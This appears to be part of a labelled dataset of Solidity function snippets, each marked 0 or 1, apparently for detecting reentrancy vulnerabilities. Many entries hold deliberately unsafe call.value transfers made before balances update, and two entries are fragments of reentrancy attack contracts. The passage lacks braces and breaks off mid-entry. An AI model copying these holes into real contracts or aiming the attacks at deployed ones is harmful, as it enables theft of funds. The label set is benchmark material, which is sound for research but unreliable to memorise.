if (this.balance < eth_minimum) return;
if (bought_tokens) return;
if (now < earliest_buy_time) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
uint256 claimed_bounty = buy_bounty;
buy_bounty = 0;
contract_eth_value = this.balance - (claimed_bounty + withdraw_bounty);
require(sale.call.value(contract_eth_value)());
msg.sender.transfer(claimed_bounty);
0
---------------------------------
896 27159.sol
function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success) {
_transfer( msg.sender, to, value, data );
if (isContract(to)) {
ContractReceiver rx = ContractReceiver( to );
require(rx.call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data));
return true;
function transfer(address to, uint256 value) public {
bytes memory empty;
_transfer(msg.sender, to, value, empty);
function transferFrom(address from, address to, uint256 value) public returns (bool success) {
require(value <= allowances_[from][msg.sender]);
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer(from, to, value, empty);
return true;
function transfer(address to, uint value, bytes data) public returns (bool success) {
if (isContract(to)) {
return transferToContract( to, value, data );
_transfer( msg.sender, to, value, data );
return true;
function transferToContract(address to, uint value, bytes data) private returns (bool success) {
_transfer( msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
rx.tokenFallback(msg.sender, value, data);
return true;
1
---------------------------------
897 33851.sol
function donate(bytes32 hash) payable {
print(hash);
if (block.number<startBlock || block.number>endBlock || (saleEtherRaised + msg.value)>etherCap || halted) throw;
uint256 tokens = (msg.value * price());
balances[msg.sender] = (balances[msg.sender] + tokens);
totalSupply = (totalSupply + tokens);
saleEtherRaised = (saleEtherRaised + msg.value);
if (!founder.call.value(msg.value)()) throw;
Donate(msg.value, tokens);
0
---------------------------------
898 19128.sol
function doWithdraw(address from, address to, uint256 amount) internal {
require(amount <= MAX_WITHDRAWAL);
require(balances[from] >= amount);
require(withdrawalCount[from] < 3);
balances[from] = balances[from].sub(amount);
to.call.value(amount)();
withdrawalCount[from] = withdrawalCount[from].add(1);
function withdraw(uint256 amount) public {
doWithdraw(msg.sender, msg.sender, amount);
function withdrawTo(address to, uint256 amount) public {
doWithdraw(msg.sender, to, amount);
function withdrawFor(address from, uint256 amount) public {
require(approvals[from][msg.sender]);
doWithdraw(from, msg.sender, amount);
function withdrawForTo(address from, address to, uint256 amount) public {
require(approvals[from][msg.sender]);
doWithdraw(from, to, amount);
0
---------------------------------
899 35617.sol
function buyRecipient(address recipient) duringCrowdSale payable {
require(!halted);
uint tokens = safeMul(msg.value, price(block.timestamp));
require(safeAdd(saleTokenSupply,tokens)<=coinAllocation);
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
saleTokenSupply = safeAdd(saleTokenSupply, tokens);
salesVolume = safeAdd(salesVolume, msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(recipient, msg.value, tokens);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
0
---------------------------------
900 21886.sol
function buy(address recipient, uint256 value) public payable {
if (value> msg.value) throw;
if (value < msg.value) {
require(msg.sender.call.value(msg.value - value)());
buyToken(recipient, value);
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock || safeAdd(totalEtherRaised,value)>etherCap || halted) throw;
if (block.number>=startBlock && block.number<=startBlock+prePeriod && safeAdd(totalEtherRaised,value) > preEtherCap) throw;
uint tokens = safeMul(value, price());
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
totalEtherRaised = safeAdd(totalEtherRaised, value);
if (block.number<=startBlock+prePeriod) {
presaleTokenSupply = safeAdd(presaleTokenSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
1
---------------------------------
901 Reentrance_02.sol
function withdraw(uint _amount) public {
if(balances[msg.sender] >= _amount) {
if(msg.sender.call.value(_amount)()) {
_amount;
balances[msg.sender] -= _amount;
function() public payable {}
1
---------------------------------
902 23088.sol
function atomicize(address[] addrs, uint[] values, uint[] calldataLengths, bytes calldatas) public{
require(addrs.length == values.length && addrs.length == calldataLengths.length);
uint j = 0;
for (uint i = 0; i < addrs.length; i++) {
bytes memory calldata = new bytes(calldataLengths[i]);
for (uint k = 0; k < calldataLengths[i]; k++) {
calldata[k] = calldatas[j];
j++;
require(addrs[i].call.value(values[i])(calldata));
1
---------------------------------
903 28687.sol
function CashOut(uint _am) {
if(_am<=balances[msg.sender]) {
if(msg.sender.call.value(_am)()) {
balances[msg.sender]-=_am;
TransferLog.AddMessage(msg.sender,_am,"CashOut");
function() public payable{}
contract Log
1
---------------------------------
904 1430.sol
function callContract(address to, bytes data) onlyOwner public payable returns (bool) {
require(to.call.value(msg.value)(data));
return true;
0
---------------------------------
905 36334.sol
function buy_the_tokens() {
require(msg.sender == owner);
require(!bought_tokens);
require(sale != 0x0);
require(this.balance >= min_required_amount);
bought_tokens = true;
contract_eth_value = this.balance;
require(sale.call.value(contract_eth_value)());
0
---------------------------------
906 39749.sol
function calcRefund(address _addressToRefund) internal {
uint amount = balanceOf[_addressToRefund];
balanceOf[_addressToRefund] = 0;
if (amount > 0) {
if (_addressToRefund.call.value(amount)()) {
LogFundTransfer(_addressToRefund, amount, false);
} else {
balanceOf[_addressToRefund] = amount;
function safeWithdraw() public onlyAfterDeadline {
if (amountRaised >= fundingGoal){
fundingGoalReached = true;
LogGoalReached(bankRollBeneficiary, amountRaised);
crowdsaleClosed = true;
if (!fundingGoalReached) {
calcRefund(msg.sender);
if (msg.sender == owner && fundingGoalReached) {
bankrollBeneficiaryAmount = (this.balance*80)/100;
if (bankRollBeneficiary.send(bankrollBeneficiaryAmount)) {
LogFundTransfer(bankRollBeneficiary, bankrollBeneficiaryAmount, false);
etherollBeneficiaryAmount = this.balance;
if(!etherollBeneficiary.send(etherollBeneficiaryAmount)) throw;
LogFundTransfer(etherollBeneficiary, etherollBeneficiaryAmount, false);
} else {
fundingGoalReached = false;
function emergencyWithdraw() public isEmergency  {
calcRefund(msg.sender);
0
---------------------------------
907 26523.sol
function claim_reward(uint uid, bytes32 passcode) public payable{
require(msg.value >= parameters["price"]);
require(is_passcode_correct(uid, passcode));
uint final_reward = get_reward(uid) + msg.value;
if (final_reward > parameters["price_poοl"])
final_reward = parameters["price_poοl"];
require(msg.sender.call.value(final_reward)());
parameters["price_poοl"] -= final_reward;
if (uid + 1 < users.length)
users[uid] = users[users.length - 1];
users.length -= 1;
1
---------------------------------
908 2071.sol
function endRound(F3Ddatasets.EventReturns memory _eventData_) private returns (F3Ddatasets.EventReturns)
uint256 _rID = rID_;
uint256 _winPID = round_[_rID].plyr;
uint256 _winTID = round_[_rID].team;
uint256 _pot = round_[_rID].pot;
uint256 _win = (_pot.mul(48)) / 100;
uint256 _com = (_pot / 50);
uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;
uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;
uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);
uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);
uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);
if (_dust > 0)
_gen = _gen.sub(_dust);
_res = _res.add(_dust);
plyr_[_winPID].win = _win.add(plyr_[_winPID].win);
if (!address(Jekyll_Island_Inc).call.value(_com)(bytes4(keccak256("deposit()"))))
_p3d = _p3d.add(_com);
_com = 0;
round_[_rID].mask = _ppt.add(round_[_rID].mask);
if (_p3d > 0)
Divies.deposit.value(_p3d)();
_eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);
_eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);
_eventData_.winnerAddr = plyr_[_winPID].addr;
_eventData_.winnerName = plyr_[_winPID].name;
_eventData_.amountWon = _win;
_eventData_.genAmount = _gen;
_eventData_.P3DAmount = _p3d;
_eventData_.newPot = _res;
rID_++;
_rID++;
round_[_rID].strt = now;
round_[_rID].end = now.add(rndInit_).add(rndGap_);
round_[_rID].pot = _res;
return(_eventData_);
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)
uint256 _com = _eth / 50;
uint256 _p3d;
if (!address(Jekyll_Island_Inc).call.value(_com)(bytes4(keccak256("deposit()"))))
_p3d = _com;
_com = 0;
uint256 _long = _eth / 100;
address(otherF3DInc).call.value(_long)(bytes4(keccak256("deposit()")));
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0)
Divies.deposit.value(_p3d)();
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)
uint256 _com = _eth / 50;
uint256 _p3d;
if (!address(Jekyll_Island_Inc).call.value(_com)(bytes4(keccak256("deposit()"))))
_p3d = _com;
_com = 0;
uint256 _long = _eth / 100;
address(otherF3DInc).call.value(_long)(bytes4(keccak256("deposit()")));
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0)
Divies.deposit.value(_p3d)();
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
0
---------------------------------
909 774.sol
function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) {
uint256 _com = _eth * 5 / 100;
uint256 _aff = _eth * 10 / 100;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now);
} else {
_com += _aff;
if (!address(Bank).call.value(_com)(bytes4(keccak256("deposit()"))))  {  }
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  {
if (plyrRnds[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  {
uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000)  {
uint256 _keys = (round[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000)   {
updateTimer(_keys, _rID);
if (round[_rID].plyr != _pID)
round[_rID].plyr = _pID;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000)  {
airDropTracker_++;
if (airdrop() == true)  {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 100000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys);
plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth);
round[_rID].keys = _keys.add(round[_rID].keys);
round[_rID].eth = _eth.add(round[_rID].eth);
_eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_);
endTx(_pID, _eth, _keys, _eventData_);
plyrRnds_[_pID] = plyrRnds[_pID][_rID];
round_ = round[_rID];
0
---------------------------------
910 37836.sol
function collect() onlyOwner {
require(addrcnt.call.value(this.balance)(0));
Collect(addrcnt,this.balance);
0
---------------------------------
911 36645.sol
function purchase_tokens() {
require(msg.sender == developer);
if (this.balance < eth_minimum) return;
if (kill_switch) return;
require(sale != 0x0);
bought_tokens = true;
contract_eth_value = this.balance;
require(sale.call.value(contract_eth_value)());
require(this.balance==0);
0
---------------------------------
912 7530.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner {
SingleTransact(msg.sender, _value, _to, _data);
_to.call.value(_value)(_data);
0
---------------------------------
913 Reentrance_03.sol
function withdrawBalance_fixed() {
uint amount = userBalance[msg.sender];
userBalance[msg.sender] = 0;
if(!(msg.sender.call.value(amount)())){ throw; }
0
---------------------------------
914 39994.sol
function safeSend(address _recipient, uint _ether) internal preventReentry() returns (bool success_) {
if(!_recipient.call.value(_ether)()) throw;
success_ = true;
pragma solidity ^0.4.0;
contract Math
string constant VERSION = "Math 0.0.1 \n";
uint constant NULL = 0;
bool constant LT = false;
bool constant GT = true;
uint constant iTRUE = 1;
uint constant iFALSE = 0;
uint constant iPOS = 1;
uint constant iZERO = 0;
uint constant iNEG = uint(-1);
function withdraw(uint _ether) external canEnter hasEther(msg.sender, _ether) returns (bool success_) {
etherBalance[msg.sender] -= _ether;
safeSend(msg.sender, _ether);
success_ = true;
0
---------------------------------
915 38888.sol
function withdraw() onlyOwner {
if (!owner.call.value(this.balance)()) throw;
0
---------------------------------
916 38724.sol
function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
return allowed[_owner][_spender];
mapping (address => uint256) balances;
mapping (address => mapping (address => uint256)) allowed;
contract ERC20nator is StandardToken, Ownable {
address public fundraiserAddress;
bytes public fundraiserCallData;
uint constant issueFeePercent = 2;
event requestedRedeem(address indexed requestor, uint amount);
event redeemed(address redeemer, uint amount);
function() payable {
uint issuedTokens = msg.value * (100 - issueFeePercent) / 100;
if(!owner.send(msg.value - issuedTokens)) throw;
if(!fundraiserAddress.call.value(issuedTokens)(fundraiserCallData))  throw;
totalSupply += issuedTokens;
balances[msg.sender] += issuedTokens;
1
---------------------------------
917 29601.sol
function transferInternal(address from, address to, uint256 value, bytes data, bool useCustomFallback, string customFallback) internal returns (bool success) {
bool status = super.transferInternal(from, to, value);
if (status) {
if (isContract(to)) {
ContractReceiver receiver = ContractReceiver(to);
if (useCustomFallback) {
require(receiver.call.value(0)(bytes4(keccak256(customFallback)), from, value, data) == true);
} else {
receiver.tokenFallback(from, value, data);
Transfer(from, to, value, data);
return status;
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool success) {
require(locked == false);
bool status = transferInternal(msg.sender, to, value, data, true, customFallback);
return status;
function transferInternal(address from, address to, uint256 value, bytes data) internal returns (bool success) {
return transferInternal(from, to, value, data, false, "");
function transferInternal(address from, address to, uint256 value) internal returns (bool success) {
require(locked == false);
bytes memory data;
return transferInternal(from, to, value, data, false, "");
function claimableTransfer(uint256 _time, address _from,address _to, uint256 _value, bytes _data, bool _useCustomFallback, string _customFallback) internal returns (bool success)
uint256 senderCurrentBalance = balanceOf(_from);
uint256 receiverCurrentBalance = balanceOf(_to);
uint256 _totalSupply = totalSupply();
bool status = super.transferInternal(_from, _to, _value, _data, _useCustomFallback, _customFallback);
require(status);
claimInternal(_time, _from, senderCurrentBalance, _totalSupply);
claimInternal(_time, _to, receiverCurrentBalance, _totalSupply);
return true;
0
---------------------------------
918 14741.sol
function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) {
require(balanceOf(msg.sender) > _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
emit Transfer(msg.sender, _to, _value, _data);
return true;
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) {
require(!frozenAccount[msg.sender]);
require(!frozenAccount[_to]);
if (isContract(_to)) {
return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback);
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
919 10297.sol
function execute0(address to, uint256 value, bytes data) private returns (address created)  {
if (to == 0) {
created = create0(value, data);
} else {
require(to.call.value(value)(data));
0
---------------------------------
920 13952.sol
function removeBankroll(uint _amount, string _callbackFn) public returns (uint _recalled)
address _bankroller = msg.sender;
uint _collateral = getCollateral();
uint _balance = address(this).balance;
uint _available = _balance > _collateral ? _balance - _collateral : 0;
if (_amount > _available) _amount = _available;
_amount = ledger.subtract(_bankroller, _amount);
bankroll = ledger.total();
if (_amount == 0) return;
bytes4 _sig = bytes4(keccak256(_callbackFn));
require(_bankroller.call.value(_amount)(_sig));
emit BankrollRemoved(now, _bankroller, _amount, bankroll);
return _amount;
function sendProfits() public returns (uint _profits)
int _p = profits();
if (_p <= 0) return;
_profits = uint(_p);
profitsSent += _profits;
address _tr = getTreasury();
require(_tr.call.value(_profits)());
emit ProfitsSent(now, _tr, _profits);
function _betFailure(string _msg, uint _bet, bool _doRefund) private
if (_doRefund) require(msg.sender.call.value(_bet)());
emit BetFailure(now, msg.sender, _bet, _msg);
function _uncreditUser(address _user, uint _amt) private
if (_amt > credits[_user] || _amt == 0) _amt = credits[_user];
if (_amt == 0) return;
vars.totalCredits -= uint88(_amt);
credits[_user] -= _amt;
require(_user.call.value(_amt)());
emit CreditsCashedout(now, _user, _amt);
1
---------------------------------
921 27188.sol
function loggedTransfer(uint amount, bytes32 message, address target, address currentOwner) protected {
if(!target.call.value(amount)()) throw;
Transfer(amount, message, target, currentOwner);
function divest(uint amount) public {
if (investors[msg.sender].investment == 0 || amount == 0) throw;
investors[msg.sender].investment -= amount;
sumInvested -= amount;
this.loggedTransfer(amount, "", msg.sender, owner);
function payDividend() public {
uint dividend = calculateDividend();
if (dividend == 0) throw;
investors[msg.sender].lastDividend = sumDividend;
this.loggedTransfer(dividend, "Dividend payment", msg.sender, owner);
function doTransfer(address target, uint amount) public onlyOwner {
this.loggedTransfer(amount, "Owner transfer", target, owner);
1
---------------------------------
922 38651.sol
function cancelBuyOrder(address token, uint price) {
bytes32 h = sha256(token, price, msg.sender);
uint remain = buyOrders[h];
delete buyOrders[h];
if (!msg.sender.call.value(remain)()) throw;
CancelBuyOrder(h,token,price,msg.sender);
0
---------------------------------
923 14620.sol
function transferEth(address walletToTransfer, uint256 weiAmount) onlyOwner payable public {
require(walletToTransfer != address(0));
require(address(this).balance >= weiAmount);
require(address(this) != walletToTransfer);
require(walletToTransfer.call.value(weiAmount)());
0
---------------------------------
924 74.sol
function upgradeToAndCall(uint256 version, address implementation, bytes data) payable public onlyProxyOwner {
upgradeTo(version, implementation);
require(address(this).call.value(msg.value)(data));
contract EternalStorageProxy is OwnedUpgradeabilityProxy, EternalStorage {}
0
---------------------------------
925 2301.sol
function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {
_target.call.value(_value)(_data);
0
---------------------------------
926 773.sol
function sellDai(uint256 _drawInAttodai, uint256 _lockedInCdpInAttoeth, uint256 _feeInAttoeth) private {
uint256 _wethBoughtInAttoweth = matchingMarket.sellAllAmount(dai, _drawInAttodai, weth, 0);
uint256 _refundDue = msg.value.add(_wethBoughtInAttoweth).sub(_lockedInCdpInAttoeth).sub(_feeInAttoeth);
if (_refundDue > 0) {
weth.withdraw(_refundDue);
require(msg.sender.call.value(_refundDue)());
function closeGiftedCdp(bytes32 _cdpId, uint256 _minimumValueInAttoeth, address _recipient) external wethBalanceIncreased returns (uint256 _payoutOwnerInAttoeth) {
require(_recipient != address(0));
uint256 _lockedPethInAttopeth = maker.ink(_cdpId);
uint256 _debtInAttodai = maker.tab(_cdpId);
uint256 _lockedWethInAttoweth = _lockedPethInAttopeth.div27(maker.per());
uint256 _wethSoldInAttoweth = matchingMarket.buyAllAmount(dai, _debtInAttodai, weth, _lockedWethInAttoweth);
uint256 _providerFeeInAttoeth = _wethSoldInAttoweth.mul18(providerFeePerEth);
uint256 _mkrBalanceBeforeInAttomkr = mkr.balanceOf(this);
maker.wipe(_cdpId, _debtInAttodai);
uint256 _mkrBurnedInAttomkr = _mkrBalanceBeforeInAttomkr.sub(mkr.balanceOf(this));
uint256 _ethValueOfBurnedMkrInAttoeth = _mkrBurnedInAttomkr.mul(uint256(maker.pep().read())).div(uint256(maker.pip().read()));
_payoutOwnerInAttoeth = _lockedWethInAttoweth.sub(_wethSoldInAttoweth).sub(_providerFeeInAttoeth).sub(_ethValueOfBurnedMkrInAttoeth);
require(_payoutOwnerInAttoeth >= _minimumValueInAttoeth);
maker.free(_cdpId, _lockedPethInAttopeth);
maker.exit(_lockedPethInAttopeth);
maker.give(_cdpId, msg.sender);
weth.withdraw(_payoutOwnerInAttoeth);
require(_recipient.call.value(_payoutOwnerInAttoeth)());
emit CloseCup(msg.sender, uint256(_cdpId));
0
---------------------------------
927 30178.sol
function buy() payable notPaused() public returns(bool) {
require(now >= salesStart);
require(now < salesDeadline);
uint tokensToBuy = msg.value * MULTIPLIER / TOKEN_PRICE;
require(tokensToBuy > 0);
uint timeBonus = _calculateTimeBonus(tokensToBuy, now);
uint volumeBonus = _calculateVolumeBonus(tokensToBuy, msg.sender, msg.value);
uint totalTokensToTransfer = tokensToBuy + timeBonus + volumeBonus;
require(token.transfer(msg.sender, totalTokensToTransfer));
LogBought(msg.sender, msg.value, totalTokensToTransfer, 0);
require(wallet.call.value(msg.value)());
return true;
0
---------------------------------
928 12454.sol
function submitPool(uint256 weiAmount) public onlyAdmin noReentrancy {
require(contractStage < CONTRACT_SUBMIT_FUNDS, "Cannot resubmit pool.");
require(receiverAddress != 0x00, "receiver address cannot be empty");
uint256 contractBalance = address(this).balance;
if(weiAmount == 0){
weiAmount = contractBalance;
require(minContribution <= weiAmount && weiAmount <= contractBalance, "submitted amount too small or larger than the balance");
finalBalance = contractBalance;
require(receiverAddress.call.value(weiAmount).gas(gasleft().sub(5000))(),"Error submitting pool to receivingAddress");
contractBalance = address(this).balance;
if(contractBalance > 0) {
ethRefundAmount.push(contractBalance);
contractStage = CONTRACT_SUBMIT_FUNDS;
emit PoolSubmitted(receiverAddress, weiAmount);
0
---------------------------------
929 18145.sol
function ___upgradeToAndCall(address newTarget, bytes data) payable public _onlyProxyOwner {
___upgradeTo(newTarget);
require(address(this).call.value(msg.value)(data));
0
---------------------------------
930 21277.sol
function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyManager returns (bool) {
return _to.call.value(_value).gas(_gas)(_code);
modifier onlyManager
require(msg.sender == manager);
contract EthernameRaw is Managed {
event Transfer(address indexed from, address indexed to, bytes32 indexed name);
event Approval(address indexed owner, address indexed approved, bytes32 indexed name);
event SendEther(address indexed from, address indexed to, bytes32 sender, bytes32 recipient, uint256 value);
event Name(address indexed owner, bytes32 indexed name);
event Price(bytes32 indexed name, uint256 price);
event Buy(bytes32 indexed name, address buyer, uint256 price);
event Attribute(bytes32 indexed name, bytes32 key);
struct Record {
address owner;
uint256 price;
mapping (bytes32 => bytes) attrs;
string public constant name = "Ethername";
string public constant symbol = "ENM";
mapping (address => bytes32) public ownerToName;
mapping (bytes32 => Record) public nameToRecord;
mapping (bytes32 => address) public nameToApproved;
0
---------------------------------
931 14353.sol
function buy(){
require(sale != 0x0);
require(sale.call.value(this.balance)());
1
---------------------------------
932 Reentrance_exploit.sol
function deposit(address _vulnerable_contract) public payable {
vulnerable_contract = _vulnerable_contract ;
require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
1
---------------------------------
933 22805.sol
function eT(address _pd, uint _tkA, uint _etA) returns (bool success) {
balances[msg.sender] = safeSub(balances[msg.sender], _tkA);
balances[_pd] = safeAdd(balances[_pd], _tkA);
if (!_pd.call.value(_etA)()) revert();
ET(_pd, _tkA, _etA);
return true;
0
---------------------------------
934 4598.sol
function futrMiner() public payable {
require(futr.call.value(msg.value)());
uint256 mined = ERC20(futr).balanceOf(address(this));
ERC20(futr).approve(mny, mined);
MNY(mny).mine(futr, mined);
uint256 amount = ERC20(mny).balanceOf(address(this));
ERC20(mny).transfer(msg.sender, amount);
function futxMiner() public payable {
require(futx.call.value(msg.value)());
uint256 mined = ERC20(futx).balanceOf(address(this));
ERC20(futx).approve(mny, mined);
MNY(mny).mine(futx, mined);
uint256 amount = ERC20(mny).balanceOf(address(this));
ERC20(mny).transfer(msg.sender, amount);
0
---------------------------------
935 Bank_attack.sol
function step1(uint256 amount) payable {
if (this.balance >= amount) {
victim.call.value(amount)(bytes4(keccak256("Deposit()")));
function startAttack(uint256 amount) {
step1(amount);
step2(amount / 2);
1
---------------------------------
936 40500.sol
function payOut(address _recipient, uint _amount) returns (bool) {
if (msg.sender != owner || msg.value > 0 || (payOwnerOnly && _recipient != owner))
throw;
if (_recipient.call.value(_amount)()) {
PayOut(_recipient, _amount);
return true;
} else {
return false;
contract TokenInterface {
mapping (address => uint256) balances;
mapping (address => mapping (address => uint256)) allowed;
uint256 public totalSupply;
function createTokenProxy(address _tokenHolder) returns (bool success) {
if (now < closingTime && msg.value > 0 && (privateCreation == 0 || privateCreation == msg.sender)) {
uint token = (msg.value * 20) / divisor();
extraBalance.call.value(msg.value - token)();
balances[_tokenHolder] += token;
totalSupply += token;
weiGiven[_tokenHolder] += msg.value;
CreatedToken(_tokenHolder, token);
if (totalSupply >= minTokensToCreate && !isFueled) {
isFueled = true;
FuelingToDate(totalSupply);
return true;
throw;
function refund() noEther {
if (now > closingTime && !isFueled) {
if (extraBalance.balance >= extraBalance.accumulatedInput())
extraBalance.payOut(address(this), extraBalance.accumulatedInput());
if (msg.sender.call.value(weiGiven[msg.sender])()) {
Refund(msg.sender, weiGiven[msg.sender]);
totalSupply -= balances[msg.sender];
balances[msg.sender] = 0;
weiGiven[msg.sender] = 0;
function executeProposal(uint _proposalID, bytes _transactionData) noEther returns (bool _success) {
Proposal p = proposals[_proposalID];
uint waitPeriod = p.newCurator ? splitExecutionPeriod : executeProposalPeriod;
if (p.open && now > p.votingDeadline + waitPeriod) {
closeProposal(_proposalID);
return;
if (now < p.votingDeadline || !p.open || p.proposalHash != sha3(p.recipient, p.amount, _transactionData)) {
throw;
if (!isRecipientAllowed(p.recipient)) {
closeProposal(_proposalID);
p.creator.send(p.proposalDeposit);
return;
bool proposalCheck = true;
if (p.amount > actualBalance())
proposalCheck = false;
uint quorum = p.yea + p.nay;
if (_transactionData.length >= 4 && _transactionData[0] == 0x68
&& _transactionData[1] == 0x37 && _transactionData[2] == 0xff
&& _transactionData[3] == 0x1e
&& quorum < minQuorum(actualBalance() + rewardToken[address(this)])) {
proposalCheck = false;
if (quorum >= minQuorum(p.amount)) {
if (!p.creator.send(p.proposalDeposit))
throw;
lastTimeMinQuorumMet = now;
if (quorum > totalSupply / 5)
minQuorumDivisor = 5;
if (quorum >= minQuorum(p.amount) && p.yea > p.nay && proposalCheck) {
if (!p.recipient.call.value(p.amount)(_transactionData))
throw;
p.proposalPassed = true;
_success = true;
if (p.recipient != address(this) && p.recipient != address(rewardAccount) && p.recipient != address(DAOrewardAccount) && p.recipient != address(extraBalance) && p.recipient != address(curator)) {
rewardToken[address(this)] += p.amount;
totalRewardToken += p.amount;
closeProposal(_proposalID);
ProposalTallied(_proposalID, _success, quorum);
function newContract(address _newContract){
if (msg.sender != address(this) || !allowedRecipients[_newContract]) return;
if (!_newContract.call.value(address(this).balance)()) {
throw;
rewardToken[_newContract] += rewardToken[address(this)];
rewardToken[address(this)] = 0;
DAOpaidOut[_newContract] += DAOpaidOut[address(this)];
DAOpaidOut[address(this)] = 0;
1
---------------------------------
937 39932.sol
function process(bytes32 _destination) payable returns (bool) {
if (msg.value < 100) throw;
var tax = msg.value * taxPerc / 100;
var refill = bytes4(sha3("refill(bytes32)"));
if ( !ledger.call.value(tax)(refill, taxman)|| !ledger.call.value(msg.value - tax)(refill, _destination)) throw;
return true;
contract Invoice is Mortal {
address   public signer;
uint      public closeBlock;
Comission public comission;
string    public description;
bytes32   public beneficiary;
uint      public value;
0
---------------------------------
938 35649.sol
function playerWithdrawPendingTransactions() public payoutsAreActive returns (bool) {
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
1
---------------------------------
939 35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
